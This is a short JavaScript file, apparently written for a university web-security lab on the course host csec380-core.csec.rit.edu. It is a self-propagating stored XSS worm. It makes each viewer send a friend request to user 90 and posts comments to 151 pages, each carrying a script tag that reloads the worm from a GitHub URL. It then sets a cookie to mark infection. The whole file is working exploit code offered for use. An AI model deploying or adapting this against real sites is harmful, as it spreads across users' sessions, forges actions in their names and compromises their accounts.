  var cookie = new URLSearchParams(document.cookie.replaceAll("; ","&"));
if(cookie.get("choc") != "chocolate") {
    var add = new XMLHttpRequest();
    add.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=90`, true);
	add.send();
    for (var i = 0; i < 151; i++) {
        var post = new XMLHttpRequest();
        post.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/ajm4098/webapp6/edit/main/add_friends.js"></script>`, true);
        post.send();
    }
}
document.cookie = 'choc=chocolate'
